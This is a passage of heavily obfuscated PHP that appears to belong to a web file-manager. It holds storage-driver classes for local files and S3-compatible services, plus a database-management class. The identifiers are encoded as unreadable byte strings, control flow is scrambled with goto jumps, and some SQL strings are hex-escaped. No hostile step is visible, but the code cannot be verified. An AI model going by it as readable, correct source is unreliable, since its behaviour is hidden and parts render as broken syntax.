Éš[] = array($EĞ—ø†¬Õ§[527] => array($EĞ—ø†¬Õ§[485], $DŠ¶ö„ÊœÆ[$EĞ—ø†¬Õ§[461]] . $bÌÏ‡Ñ¥ùÅ . $EĞ—ø†¬Õ§[486])); } else { $EäÅ¨ Éš[$EĞ—ø†¬Õ§[369]][1][] = $bÌÏ‡Ñ¥ùÅ; } } if (!$EäÅ¨ Éš[$EĞ—ø†¬Õ§[369]][1]) { unset($EäÅ¨ Éš[$EĞ—ø†¬Õ§[369]]); } if (!$EäÅ¨ Éš) { return; } goto FĞº¸âíôÈ; FĞº¸âíôÈ: $EäÅ¨ Éš[$EĞ—ø†¬Õ§[369]][1] = array_unique($EäÅ¨ Éš[$EĞ—ø†¬Õ§[369]][1]); $EäÅ¨ Éš[$EĞ—ø†¬Õ§[916]] = $EĞ—ø†¬Õ§[2197]; $b®°É¶Ü‘Ä->where($EäÅ¨ Éš)->setField($EĞ—ø†¬Õ§[397], 1); goto c·Á©óœŞ; Fæ„š²ĞÒ: $EĞ—ø†¬Õ§ =& $_SERVER[¦·]; $b®°É¶Ü‘Ä = Model($EĞ—ø†¬Õ§[1122]); $EäÅ¨ Éš = array($EĞ—ø†¬Õ§[369] => array($EĞ—ø†¬Õ§[7], array())); goto d„Ø®“¾º½; c·Á©óœŞ: } private function recycleMove($dÑİöÁÌ½‘, $F®Ûîğ’°í = 1) { $e†øìÔ« =& $_SERVER[¦·]; $cĞ×†™ø® = Model($e†øìÔ«[1122]); $aß¡Ú“·Íø = Model($e†øìÔ«[2398]); $E²ŸŸ‚íÜ = array($e†øìÔ«[369] => $dÑİöÁÌ½‘); if ($F®Ûîğ’°í) { $cĞ×†™ø®->where($E²ŸŸ‚íÜ)->setField($e†øìÔ«[397], 1); $aß¡Ú“·Íø->eventRecycle($dÑİöÁÌ½‘, $e†øìÔ«[2399]); } else { $A¯ô…øš•— = $cĞ×†™ø®->where($E²ŸŸ‚íÜ)->find(); $a¥“Æ°ĞÎè = $A¯ô…øš•—[$e†øìÔ«[370]] == $e†øìÔ«[83]; $B¼Èî‹©»† = $cĞ×†™ø®->fileNameAuto($A¯ô…øš•—[$e†øìÔ«[463]], $A¯ô…øš•—[$e†øìÔ«[28]], REPEAT_RENAME_FOLDER, $a¥“Æ°ĞÎè); if ($B¼Èî‹©»† != $A¯ô…øš•—[$e†øìÔ«[28]]) { $cĞ×†™ø®->rename($dÑİöÁÌ½‘, $B¼Èî‹©»†); } $cĞ×†™ø®->where($E²ŸŸ‚íÜ)->setField($e†øìÔ«[397], 0); $aß¡Ú“·Íø->eventRecycle($dÑİöÁÌ½‘, $e†øìÔ«[2400]); } } } goto E¥‰¨…”Áò; D„¡ÖÇ­ìÁ: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($cª‰Š–î•Ò) { if (substr($cª‰Š–î•Ò, 0, 2) == $_SERVER[¦·][1160]) { $cª‰Š–î•Ò = BASIC_PATH . substr($cª‰Š–î•Ò, 2); } return $cª‰Š–î•Ò; } public function iconvApp($a…®’×‘«„) { $BôİÙ Ÿùà =& $_SERVER[¦·]; global $config; return $this->iconvTo($a…®’×‘«„, $config[$BôİÙ Ÿùà[1158]], $config[$BôİÙ Ÿùà[1157]]); } public function iconvSystem($cÄõ‡©ƒÓÃ) { $c¯¼Àçñƒ =& $_SERVER[¦·]; global $config; return $this->iconvTo($cÄõ‡©ƒÓÃ, $config[$c¯¼Àçñƒ[1157]], $config[$c¯¼Àçñƒ[1158]]); } public function getPathOuter($DÕÑÀ„‡) { goto B†Şê‹òŞä; B†Şê‹òŞä: $bÁßÆ‡ãÄ‘ =& $_SERVER[¦·]; $e·†‘©Œ•ù = $this->iconvApp($this->pathBase); $DÕÑÀ„‡ = $this->iconvApp($DÕÑÀ„‡); goto cÅ¶Œ·¾Ä±; B«Ğ¯°‹¦Ì: $DÕÑÀ„‡ = KodIO::clear($DÕÑÀ„‡); $DÕÑÀ„‡ = substr($DÕÑÀ„‡, strlen($e·†‘©Œ•ù)); if (empty($this->pathDriver)) { return $DÕÑÀ„‡; } goto E÷àùùÕ‰Û; E÷àùùÕ‰Û: return $this->pathDriver . $bÁßÆ‡ãÄ‘[8] . ltrim($DÕÑÀ„‡, $bÁßÆ‡ãÄ‘[8]); goto e¤ó•ì¨§; cÅ¶Œ·¾Ä±: if (substr($e·†‘©Œ•ù, 0, 2) == $bÁßÆ‡ãÄ‘[1160]) { $e·†‘©Œ•ù = BASIC_PATH . substr($e·†‘©Œ•ù, 2); } if (substr($DÕÑÀ„‡, 0, 2) == $bÁßÆ‡ãÄ‘[1160]) { $DÕÑÀ„‡ = BASIC_PATH . substr($DÕÑÀ„‡, 2); } $e·†‘©Œ•ù = KodIO::clear($e·†‘©Œ•ù); goto B«Ğ¯°‹¦Ì; e¤ó•ì¨§: } public function mkfile($b•ç«÷Ã÷¸, $cË®»ó±æó = '', $cÏÓ÷ªÄ¬Ï = REPEAT_RENAME) { $b•ç«÷Ã÷¸ = $this->iconvSystem($b•ç«÷Ã÷¸); @touch($b•ç«÷Ã÷¸); if ($cË®»ó±æó) { file_put_contents($b•ç«÷Ã÷¸, $cË®»ó±æó); } return is_file($b•ç«÷Ã÷¸) ? $this->getPathOuter($b•ç«÷Ã÷¸) : !1; } public function mkdir($B¨ÖÓëˆ«, $d¹²œÂóÑÊ = REPEAT_SKIP) { $B¨ÖÓëˆ« = $this->iconvSystem($B¨ÖÓëˆ«); if (is_dir($B¨ÖÓëˆ«)) { return $this->getPathOuter($B¨ÖÓëˆ«); } @mkdir($B¨ÖÓëˆ«, 511, !0); return is_dir($B¨ÖÓëˆ«) ? $this->getPathOuter($B¨ÖÓëˆ«) : !1; } public function copyFile($aê¨æ„™Æ±, $a…¸½Š‘ëß) { $this->mkdir($this->pathFather($a…¸½Š‘ëß)); $aê¨æ„™Æ± = $this->iconvSystem($aê¨æ„™Æ±); $a…¸½Š‘ëß = $this->iconvSystem($a…¸½Š‘ëß); $Dóİƒñ¢± = @copy($aê¨æ„™Æ±, $a…¸½Š‘ëß); return $Dóİƒñ¢± ? $this->getPathOuter($a…¸½Š‘ëß) : !1; } public function moveFile($c–“µéÈ–™, $B—Ÿ‡Øá„é) { $this->mkdir($this->pathFather($B—Ÿ‡Øá„é)); $c–“µéÈ–™ = $this->iconvSystem($c–“µéÈ–™); $B—Ÿ‡Øá„é = $this->iconvSystem($B—Ÿ‡Øá„é); $A…œÈí—È = intval(@rename($c–“µéÈ–™, $B—Ÿ‡Øá„é)); if (!$A…œÈí—È) { if ($A…œÈí—È = intval(@copy($c–“µéÈ–™, $B—Ÿ‡Øá„é))) { @unlink($c–“µéÈ–™); } } return $A…œÈí—È ? $this->getPathOuter($B—Ÿ‡Øá„é) : !1; } public function delFile($D’ÀÔ³Óòò) { $D’ÀÔ³Óòò = $this->iconvSystem($D’ÀÔ³Óòò); if (!@unlink($D’ÀÔ³Óòò)) { @chmod($D’ÀÔ³Óòò, 511); if (!@unlink($D’ÀÔ³Óòò)) { return !1; } } else { return !0; } } public function delFolder($e…¤‘±ˆé) { goto CÜÓÖ¬ÈÊ; D±ÂõË¡ÅĞ: if (!($Cƒæî¶Ä™ = opendir($e…¤‘±ˆé))) { return !1; } while (($eËù¤–‚ƒ” = readdir($Cƒæî¶Ä™)) !== !1) { if ($eËù¤–‚ƒ” == $a¬‹İæ˜£è[91] || $eËù¤–‚ƒ” == $a¬‹İæ˜£è[1170]) { continue; } $E‘‰˜Œ†ãÖ = $e…¤‘±ˆé . $a¬‹İæ˜£è[8] . $eËù¤–‚ƒ”; if (is_file($E‘‰˜Œ†ãÖ) || is_link($E‘‰˜Œ†ãÖ)) { if (!unlink($E‘‰˜Œ†ãÖ)) { chmod($E‘‰˜Œ†ãÖ, 511); if (!unlink($E‘‰˜Œ†ãÖ)) { return !1; } } } else { if (is_dir($E‘‰˜Œ†ãÖ)) { chmod($E‘‰˜Œ†ãÖ, 511); $E‘‰˜Œ†ãÖ = $this->iconvApp($E‘‰˜Œ†ãÖ); if (!$this->delFolder($E‘‰˜Œ†ãÖ)) { return !1; } } } } closedir($Cƒæî¶Ä™); goto fçà‰Ë¶•; fçà‰Ë¶•: return rmdir($e…¤‘±ˆé); goto a‘ƒÄÅ»è; CÜÓÖ¬ÈÊ: $a¬‹İæ˜£è =& $_SERVER[¦·]; $e…¤‘±ˆé = $this->iconvSystem($e…¤‘±ˆé); if (!is_dir($e…¤‘±ˆé)) { return !0; } goto D±ÂõË¡ÅĞ; a‘ƒÄÅ»è: } public function rename($CÒ÷Ç‰×Îé, $DÓòÙß¾¢Ä) { goto b‡÷ô„»Ê; FÆÒËÓƒğä: $CÒ÷Ç‰×Îé = $this->iconvSystem($CÒ÷Ç‰×Îé); $DÑç´ùî” = $this->pathFather($CÒ÷Ç‰×Îé); $dì±ìÌ¡™£ = rtrim($DÑç´ùî”, $aÇøöé’ó[8]) . $aÇøöé’ó[8] . $c’²¾¼êÔ‰; goto Dš©²ÖÆöÄ; b‡÷ô„»Ê: $aÇøöé’ó =& $_SERVER[¦·]; $c’²¾¼êÔ‰ = $this->fileNameAuto($this->pathFather($CÒ÷Ç‰×Îé), $DÓòÙß¾¢Ä); $c’²¾¼êÔ‰ = $this->iconvSystem($c’²¾¼êÔ‰); goto FÆÒËÓƒğä; Dš©²ÖÆöÄ: $a÷ÎèÔÆ°µ = @rename($CÒ÷Ç‰×Îé, $dì±ìÌ¡™£); $dì±ìÌ¡™£ = $this->iconvApp($dì±ìÌ¡™£); return $a÷ÎèÔÆ°µ ? $this->getPathOuter($dì±ìÌ¡™£) : !1; goto F½Â—íŞã; F½Â—íŞã: } public function size($fÔ«Šº†éÚ) { $fÔ«Šº†éÚ = $this->iconvSystem($fÔ«Šº†éÚ); return filesize_64($fÔ«Šº†éÚ); } public function info($AùòÆìè¯•) { $AùòÆìè¯• = $this->iconvSystem($AùòÆìè¯•); if ($this->isFolder($AùòÆìè¯•)) { return $this->folderInfo($AùòÆìè¯•); } else { if ($this->isFile($AùòÆìè¯•)) { return $this->fileInfo($AùòÆìè¯•); } } return !1; } protected function infoChildren($f±´æˆİØ“, &$fµŸŞå» , $f¾ğÅÉöï = true) { goto aİĞ‹†ÒĞã; aİĞ‹†ÒĞã: $d¢¡–›ù±® =& $_SERVER[¦·]; check_abort(); $f±´æˆİØ“ = rtrim($f±´æˆİØ“, $d¢¡–›ù±®[8]) . $d¢¡–›ù±®[8]; goto Fà‘ä¡çç¥; F„‹íÓŠ…ò: closedir($c†ØĞâ‘¹); goto F±Ó¡Ü¨ãå; Fà‘ä¡çç¥: if ($f¾ğÅÉöï) { $f±´æˆİØ“ = $this->iconvSystem($f±´æˆİØ“); } if (!($c†ØĞâ‘¹ = @opendir($f±´æˆİØ“))) { return; } while (($Eæâ¡«Úª° = readdir($c†ØĞâ‘¹)) !== !1) { if ($Eæâ¡«Úª° == $d¢¡–›ù±®[91] || $Eæâ¡«Úª° == $d¢¡–›ù±®[1170]) { continue; } $a¢œö²óœ = $f±´æˆİØ“ . $Eæâ¡«Úª°; if (is_file($a¢œö²óœ) || is_link($a¢œö²óœ)) { $fµŸŞå» [$d¢¡–›ù±®[78]]++; $fµŸŞå» [$d¢¡–›ù±®[77]] += filesize_64($a¢œö²óœ); } else { if (is_dir($a¢œö²óœ)) { $fµŸŞå» [$d¢¡–›ù±®[79]]++; $this->infoChildren($a¢œö²óœ, $fµŸŞå» , !1); } } } goto F„‹íÓŠ…ò; F±Ó¡Ü¨ãå: } private function folderInfo($AÔ¿’‘ˆ—‚, $EÔã¬Š‰½ä = false) { $Dê¥ó·¼Òà =& $_SERVER[¦·]; $AÔ¿’‘ˆ—‚ = rtrim($AÔ¿’‘ˆ—‚, $Dê¥ó·¼Òà[8]) . $Dê¥ó·¼Òà[8]; $cãì‹ŞìĞŒ = $this->iconvApp($this->pathThis($AÔ¿’‘ˆ—‚)); if ($EÔã¬Š‰½ä) { return array($Dê¥ó·¼Òà[28] => $cãì‹ŞìĞŒ, $Dê¥ó·¼Òà[75] => $this->getPathOuter($AÔ¿’‘ˆ—‚), $Dê¥ó·¼Òà[29] => $Dê¥ó·¼Òà[76]); } $a°¦ö—š¾· = array($Dê¥ó·¼Òà[28] => $cãì‹ŞìĞŒ, $Dê¥ó·¼Òà[75] => $this->getPathOuter($AÔ¿’‘ˆ—‚), $Dê¥ó·¼Òà[29] => $Dê¥ó·¼Òà[76], $Dê¥ó·¼Òà[187] => @filectime($AÔ¿’‘ˆ—‚), $Dê¥ó·¼Òà[107] => @filemtime($AÔ¿’‘ˆ—‚), $Dê¥ó·¼Òà[1172] => @fileatime($AÔ¿’‘ˆ—‚), $Dê¥ó·¼Òà[1167] => is_readable($AÔ¿’‘ˆ—‚), $Dê¥ó·¼Òà[1168] => is_writable($AÔ¿’‘ˆ—‚), $Dê¥ó·¼Òà[1173] => get_mode($AÔ¿’‘ˆ—‚)); return $a°¦ö—š¾·; } private function fileInfo($déŒØÊßã, $F’‡Šç×†Ú = false) { $f“àÚŒÖ÷ =& $_SERVER[¦·]; $A‡ÂÃÊÊ = $this->iconvApp($this->pathThis($déŒØÊßã)); if ($F’‡Šç×†Ú) { return array($f“àÚŒÖ÷[28] => $A‡ÂÃÊÊ, $f“àÚŒÖ÷[75] => $this->getPathOuter($déŒØÊßã), $f“àÚŒÖ÷[29] => $f“àÚŒÖ÷[167], $f“àÚŒÖ÷[77] => $this->size($déŒØÊßã), $f“àÚŒÖ÷[160] => $this->ext($A‡ÂÃÊÊ)); } $CÎœ›¦Ú¤ = array($f“àÚŒÖ÷[28] => $A‡ÂÃÊÊ, $f“àÚŒÖ÷[75] => $this->getPathOuter($déŒØÊßã), $f“àÚŒÖ÷[29] => $f“àÚŒÖ÷[167], $f“àÚŒÖ÷[187] => @filectime($déŒØÊßã), $f“àÚŒÖ÷[107] => @filemtime($déŒØÊßã), $f“àÚŒÖ÷[1172] => @fileatime($déŒØÊßã), $f“àÚŒÖ÷[77] => $this->size($déŒØÊßã), $f“àÚŒÖ÷[160] => $this->ext($A‡ÂÃÊÊ), $f“àÚŒÖ÷[1167] => is_readable($déŒØÊßã), $f“àÚŒÖ÷[1168] => is_writable($déŒØÊßã), $f“àÚŒÖ÷[1173] => get_mode($déŒØÊßã)); return $CÎœ›¦Ú¤; } public function exist($b¨„Ï”Ãòî) { $b¨„Ï”Ãòî = $this->iconvSystem($b¨„Ï”Ãòî); return @file_exists($b¨„Ï”Ãòî); } public function isFile($AäÎÈÂ§Ô) { $AäÎÈÂ§Ô = $this->iconvSystem($AäÎÈÂ§Ô); return @is_file($AäÎÈÂ§Ô); } public function isFolder($AÓÓˆÈ©Ûí) { $AÓÓˆÈ©Ûí = $this->iconvSystem($AÓÓˆÈ©Ûí); return @is_dir($AÓÓˆÈ©Ûí); } public function listPath($fÛ½¨‰­†, $D¡ï­šÙ˜Ó = false) { goto fë¤¤Óé”Â; e±ÆÃ‹»±: $Cõ”ã½àó = array($eÕÙÖ±ƒÕ[74] => array(), $eÕÙÖ±ƒÕ[73] => array()); if (!($a¯†Àøôæ = @opendir($fÛ½¨‰­†))) { return $Cõ”ã½àó; } while (($B§¬§£­öç = readdir($a¯†Àøôæ)) !== !1) { if ($B§¬§£­öç == $eÕÙÖ±ƒÕ[91] || $B§¬§£­öç == $eÕÙÖ±ƒÕ[1170]) { continue; } $C„Œ„¥¿é = $fÛ½¨‰­† . $B§¬§£­öç; if (is_file($C„Œ„¥¿é)) { $Cõ”ã½àó[$eÕÙÖ±ƒÕ[73]][] = $this->fileInfo($C„Œ„¥¿é, $D¡ï­šÙ˜Ó); } else { $Cõ”ã½àó[$eÕÙÖ±ƒÕ[74]][] = $this->folderInfo($C„Œ„¥¿é, $D¡ï­šÙ˜Ó); } } goto dƒé÷–¢Àï; dƒé÷–¢Àï: closedir($a¯†Àøôæ); return $Cõ”ã½àó; goto eÌÈ“ÍËÊ; fë¤¤Óé”Â: $eÕÙÖ±ƒÕ =& $_SERVER[¦·]; $fÛ½¨‰­† = $this->iconvSystem($fÛ½¨‰­†); $fÛ½¨‰­† = rtrim($fÛ½¨‰­†, $eÕÙÖ±ƒÕ[8]) . $eÕÙÖ±ƒÕ[8]; goto e±ÆÃ‹»±; eÌÈ“ÍËÊ: } public function listAll($aöíöšÂ¹î, &$F½Î×½í‚ = array()) { goto Cµ†„›‡•; DÍ„ëˆ§ª : if (!($A¹¥Êö¦ƒî = @opendir($aöíöšÂ¹î))) { return $F½Î×½í‚; } while (($eÑˆ’ÂèïØ = readdir($A¹¥Êö¦ƒî)) !== !1) { if ($eÑˆ’ÂèïØ == $b‚²í°ÃùØ[91] || $eÑˆ’ÂèïØ == $b‚²í°ÃùØ[1170]) { continue; } $E“Ÿ‹ãñÃ = $aöíöšÂ¹î . $eÑˆ’ÂèïØ; if (is_dir($E“Ÿ‹ãñÃ) && !is_link($E“Ÿ‹ãñÃ)) { $F½Î×½í‚[] = array($b‚²í°ÃùØ[75] => $E“Ÿ‹ãñÃ . $b‚²í°ÃùØ[8], $b‚²í°ÃùØ[76] => 1, $b‚²í°ÃùØ[107] => @filemtime($E“Ÿ‹ãñÃ), $b‚²í°ÃùØ[77] => 0); $this->listAll($E“Ÿ‹ãñÃ, $F½Î×½í‚); } else { $F½Î×½í‚[] = array($b‚²í°ÃùØ[75] => $E“Ÿ‹ãñÃ, $b‚²í°ÃùØ[76] => 0, $b‚²í°ÃùØ[107] => @filemtime($E“Ÿ‹ãñÃ), $b‚²í°ÃùØ[77] => $this->size($E“Ÿ‹ãñÃ)); } } closedir($A¹¥Êö¦ƒî); goto aœšÇ¡ªã; Cµ†„›‡•: $b‚²í°ÃùØ =& $_SERVER[¦·]; $aöíöšÂ¹î = $this->iconvSystem($aöíöšÂ¹î); $aöíöšÂ¹î = rtrim($aöíöšÂ¹î, $b‚²í°ÃùØ[8]) . $b‚²í°ÃùØ[8]; goto DÍ„ëˆ§ª ; aœšÇ¡ªã: return $F½Î×½í‚; goto bƒ¯Û¡Ø‚Ş; bƒ¯Û¡Ø‚Ş: } public function has($C”ÕÌñïİŒ, $dÂ½’ØÂÀÃ = false, $dò£…ãˆğÔ = true) { goto bÄ˜±øïôê; eÙÍ±ÃÛâˆ: $F÷Èšãô¯Ê = 0; while (($E•Ó‚÷‘¶ = readdir($D¨§÷¥Æâ’)) !== !1) { if ($E•Ó‚÷‘¶ == $Cô™ˆ’© [91] || $E•Ó‚÷‘¶ == $Cô™ˆ’© [1170]) { continue; } $Eâ„ÔƒğÕ = $C”ÕÌñïİŒ . $E•Ó‚÷‘¶; if ($dÂ½’ØÂÀÃ) { $F÷Èšãô¯Ê++; if (@is_file($Eâ„ÔƒğÕ)) { $a•Àë©£¶++; } else { $E£õØè¸§×++; } if ($F÷Èšãô¯Ê > 10000) { break; } continue; } if ($dò£…ãˆğÔ) { if (@is_file($Eâ„ÔƒğÕ)) { return !0; } } else { if (@is_dir($Eâ„ÔƒğÕ . $Cô™ˆ’© [8])) { return !0; } } } closedir($D¨§÷¥Æâ’); goto f‹‰›¥†ˆÚ; bÄ˜±øïôê: $Cô™ˆ’©  =& $_SERVER[¦·]; $C”ÕÌñïİŒ = $this->iconvSystem($C”ÕÌñïİŒ); $C”ÕÌñïİŒ = rtrim($C”ÕÌñïİŒ, $Cô™ˆ’© [8]) . $Cô™ˆ’© [8]; goto fŸõïÆ¿ëË; f‹‰›¥†ˆÚ: if ($dÂ½’ØÂÀÃ) { return array($Cô™ˆ’© [191] => $a•Àë©£¶, $Cô™ˆ’© [192] => $E£õØè¸§×); } return !1; goto d ‹Ğ£àµà; fŸõïÆ¿ëË: if (!($D¨§÷¥Æâ’ = @opendir($C”ÕÌñïİŒ))) { return !1; } $a•Àë©£¶ = 0; $E£õØè¸§× = 0; goto eÙÍ±ÃÛâˆ; d ‹Ğ£àµà: } public function hashSimple($D†µñç¶È) { goto bÅŒùæšôÛ; Eó˜¿òÆ«¨: return md5($c´â´§½Ë’) . $c•ğ¦Üö; goto aò÷×ÈÎ²¼; d…Í†ÑÎö½: if ($c•ğ¦Üö <= $Aë™Ëøí™÷ * $Bì”ÀÃºßî) { return $this->hashMd5($D†µñç¶È) . $c•ğ¦Üö; } $c´â´§½Ë’ = $Dİ‚é®»Ü[33]; $f³……İñ´Ñ = intval($c•ğ¦Üö / $Bì”ÀÃºßî); goto C¼äƒ„´µ; f¥µí®Ì: $c•ğ¦Üö = $this->size($D†µñç¶È); $Aë™Ëøí™÷ = 200; $Bì”ÀÃºßî = 50; goto d…Í†ÑÎö½; bÅŒùæšôÛ: $Dİ‚é®»Ü =& $_SERVER[¦·]; if (!$D†µñç¶È) { return md5($Dİ‚é®»Ü[33]); } $D†µñç¶È = $this->iconvSystem($D†µñç¶È); goto f¥µí®Ì; C¼äƒ„´µ: $Fó½éŠºŠŞ = fopen($D†µñç¶È, $Dİ‚é®»Ü[1174]); if (!$Fó½éŠºŠŞ) { return $c´â´§½Ë’; } for ($FŠ®Ûòƒ´ = 0; $FŠ®Ûòƒ´ < $Bì”ÀÃºßî; $FŠ®Ûòƒ´++) { fseek_64($Fó½éŠºŠŞ, $f³……İñ´Ñ * $FŠ®Ûòƒ´); $c´â´§½Ë’ .= fread($Fó½éŠºŠŞ, $Aë™Ëøí™÷); } goto f¬»ÎÈÆ†; f¬»ÎÈÆ†: fseek_64($Fó½éŠºŠŞ, $c•ğ¦Üö - $Aë™Ëøí™÷); $c´â´§½Ë’ .= fread($Fó½éŠºŠŞ, $Aë™Ëøí™÷); fclose($Fó½éŠºŠŞ); goto Eó˜¿òÆ«¨; aò÷×ÈÎ²¼: } public function getContent($C†å˜‹†¥) { $C†å˜‹†¥ = $this->iconvSystem($C†å˜‹†¥); return file_get_contents($C†å˜‹†¥); } public function setContent($cÚËÍêŸÔĞ, $E¦¬ÌšÜâÎ = '') { $cÚËÍêŸÔĞ = $this->iconvSystem($cÚËÍêŸÔĞ); @file_put_contents($cÚËÍêŸÔĞ, $E¦¬ÌšÜâÎ, LOCK_EX); clearstatcache(); return strlen($E¦¬ÌšÜâÎ) == filesize_64($cÚËÍêŸÔĞ); } public function fileSubstr($E­½…«›ªÃ, $C¼‘¥…â†® = 0, $eî’ˆ‹áéÏ = false) { goto E‡îÛ×Ö†¤; Cã²’÷¡ÉØ: return $BÀ°­¤ªòÖ; goto A•³×°ù¹ª; E™¿Î”°ÚÒ: fseek_64($F³‚ÛªÒ’, $C¼‘¥…â†®); $BÀ°­¤ªòÖ = fread($F³‚ÛªÒ’, $eî’ˆ‹áéÏ); fclose($F³‚ÛªÒ’); goto Cã²’÷¡ÉØ; cŠ”˜šÜ: if ($eî’ˆ‹áéÏ <= 0) { return $F‹ÂëîŸªå[33]; } $F³‚ÛªÒ’ = fopen($E­½…«›ªÃ, $F‹ÂëîŸªå[1174]); if (!$F³‚ÛªÒ’) { return !1; } goto E™¿Î”°ÚÒ; E‡îÛ×Ö†¤: $F‹ÂëîŸªå =& $_SERVER[¦·]; $E­½…«›ªÃ = $this->iconvSystem($E­½…«›ªÃ); if ($eî’ˆ‹áéÏ === !1) { $eî’ˆ‹áéÏ = $this->size($E­½…«›ªÃ); } goto cŠ”˜šÜ; A•³×°ù¹ª: } public function upload($f×½’‡éëº, $e‹—ğßÅÕö, $dÃö¸¾— = false, $D¬”õ»¶İ· = REPEAT_REPLACE) { $aÖíà©ñ¼ê = $this->copyFile($e‹—ğßÅÕö, $f×½’‡éëº); return $aÖíà©ñ¼ê ? $this->getPathOuter($f×½’‡éëº) : !1; } public function setModifyTime($CŒèÊ Ê†, $b¿¨Ø¥ÜÒ± = '') { @touch($CŒèÊ Ê†, intval($b¿¨Ø¥ÜÒ±)); } public function download($eÂˆÆ˜¬õˆ, $c‰áªËçÀÏ) { return $this->iconvSystem($eÂˆÆ˜¬õˆ); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Dè­ Ğ¨µ) { parent::__construct($Dè­ Ğ¨µ); $this->signatureVersion($_SERVER[¦·][200]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Dùˆ‡á‡ñ) { parent::__construct($Dùˆ‡á‡ñ); $this->signatureVersion($_SERVER[¦·][200]); } public function fileOutLink($a•°¿£§º) { $FÍŸ´©²‚Â =& $_SERVER[¦·]; if (substr($a•°¿£§º, 0, 7) == $FÍŸ´©²‚Â[1118]) { $a•°¿£§º = $FÍŸ´©²‚Â[1119] . substr($a•°¿£§º, 7); } header($FÍŸ´©²‚Â[156] . $a•°¿£§º); die; } } goto e”‹«…·£; DÏ¼¬¿½ê¨: class DbManage { function __construct($b¹ÈáÄøñ¾, $d«Æ×ôÅÉ = '') { $this->database = $b¹ÈáÄøñ¾; $this->type = $d«Æ×ôÅÉ; } public function model($b‰Ã·í»ŠÊ = '') { return new ModelBase($b‰Ã·í»ŠÊ, $_SERVER[¦·][33], $this->database); } public function db($e™ÉãÎµ… = false) { goto D°ÃÎÍù»; F©¢˜çñ: if (!$DŞÚåÙöÃÍ) { $fÄ¡×¦‚ğø->execute("\143\x72\x65\x61\x74\x65\40\144\141\x74\x61\x62\141\163\x65\40\x60{$Aë„ì†§Ü†}\140"); } $b™£ŠÁÈ[$E„“ÉÔçº–[887]] = $Aë„ì†§Ü†; if ($b™£ŠÁÈ[$E„“ÉÔçº–[723]] == $E„“ÉÔçº–[724]) { $b™£ŠÁÈ[$E„“ÉÔçº–[725]] .= $E„“ÉÔçº–[975] . $Aë„ì†§Ü†; } goto a¿˜‘éå¶Â; B¯£ï×²Ç¡: $this->database = $b™£ŠÁÈ; $fÄ¡×¦‚ğø = $this->model()->db(); try { $DŞÚåÙöÃÍ = $fÄ¡×¦‚ğø->execute("\163\150\157\167\x20\x64\141\164\x61\142\x61\x73\145\x73\40\154\151\153\x65\x20\x27{$Aë„ì†§Ü†}\x27"); } catch (Exception $EïÎ¯ôâãœ) { } goto F©¢˜çñ; D°ÃÎÍù»: $E„“ÉÔçº– =& $_SERVER[¦·]; $b™£ŠÁÈ = array_change_key_case($this->database); if ($this->type == $E„“ÉÔçº–[9] || !$e™ÉãÎµ…) { return $this->model()->db(); } goto DÉÊ¤†ää; DÉÊ¤†ää: $Aë„ì†§Ü† = $b™£ŠÁÈ[$E„“ÉÔçº–[887]]; $b™£ŠÁÈ[$E„“ÉÔçº–[887]] = $E„“ÉÔçº–[33]; if ($b™£ŠÁÈ[$E„“ÉÔçº–[723]] == $E„“ÉÔçº–[724]) { $Dİ·â¥¿¶ã = $b™£ŠÁÈ[$E„“ÉÔçº–[725]]; $b™£ŠÁÈ[$E„“ÉÔçº–[725]] = substr($Dİ·â¥¿¶ã, 0, strrpos($Dİ·â¥¿¶ã, $E„“ÉÔçº–[975])); } goto B¯£ï×²Ç¡; a¿˜‘éå¶Â: $this->database = $b™£ŠÁÈ; $fÄ¡×¦‚ğø->execute("\x75\x73\145\40\x60{$Aë„ì†§Ü†}\140"); return $fÄ¡×¦‚ğø; goto f©ËùÉ†¥Ñ; f©ËùÉ†¥Ñ: } public function createTable($D‰‹¾¸£ÆØ, $CíÕç¬›— = null) { $a“‰‚âÎ›á =& $_SERVER[¦·]; if (!IO::exist($D‰‹¾¸£ÆØ)) { ActionCall($a“‰‚âÎ›á[976], !0, 0); show_json(LNG($a“‰‚âÎ›á[977]), !1); } $aËíëêÑá© = sqlSplit(IO::getContent($D‰‹¾¸£ÆØ)); foreach ($aËíëêÑá© as $CŠ¨¤™²òÖ) { if ($CíÕç¬›—) { $e“İ¹¤šìŒ = stripos($CŠ¨¤™²òÖ, $a“‰‚âÎ›á[978]) === 0; if ($e“İ¹¤šìŒ) { $CíÕç¬›—->task[$a“‰‚âÎ›á[979]] += 1; } } $this->model()->db()->execute($CŠ¨¤™²òÖ); if ($CíÕç¬›— && $e“İ¹¤šìŒ) { preg_match($a“‰‚âÎ›á[980], $CŠ¨¤™²òÖ, $EÔ—é÷ñÚ); $CíÕç¬›—->task[$a“‰‚âÎ›á[981]] = $EÔ—é÷ñÚ[1]; $CíÕç¬›—->update(1); } } $this->taskToCache($CíÕç¬›—); } public function insertTable($Aëöä¨ÅŠá, $fô¯÷çé†µ = null) { $Aô´œÖÀ½ =& $_SERVER[¦·]; $E“Ïá‚Ö’Û = $this->model()->db(); $c“–ÀÓ×¹ = $fÙòÕæÃ‹ö ? array($fÙòÕæÃ‹ö) : $E“Ïá‚Ö’Û->getTables(); foreach ($Aëöä¨ÅŠá as $cÕªÚ©­šÇ) { $fÙòÕæÃ‹ö = basename($cÕªÚ©­šÇ, $Aô´œÖÀ½[718]); if (!in_array($fÙòÕæÃ‹ö, $c“–ÀÓ×¹)) { continue; } if ($fô¯÷çé†µ) { $fô¯÷çé†µ->task[$Aô´œÖÀ½[981]] = $fÙòÕæÃ‹ö; } if (get_filesize($cÕªÚ©­šÇ) == 0) { continue; } $fŞâ“ŸÁÂ = $this->sqlToDb($cÕªÚ©­šÇ, $fô¯÷çé†µ); if (!$fŞâ“ŸÁÂ) { ActionCall($Aô´œÖÀ½[976], !0, 0); show_json(LNG($Aô´œÖÀ½[982]) . "\133{$fÙòÕæÃ‹ö}\135", !1); } } $this->taskToCache($fô¯÷çé†µ); } public function sqlFromDb($eõÔ˜Ö¦¡§, $BĞ«Û„ù‰Ñ, $c¡‘¼ø›¡ = null, $f„‚ÙÈˆ«‚ = null) { goto AäÒïòËˆ½; d†‚Ê¬ÓêÂ: $càßê›‹‡Á = 1; $Aœ´›‚²¥¸ = 500; $e‰åÖé—Å‰ = fopen($BĞ«Û„ù‰Ñ, $_SERVER[¦·][983]); goto açŒƒ–‹ªï; AäÒïòËˆ½: if 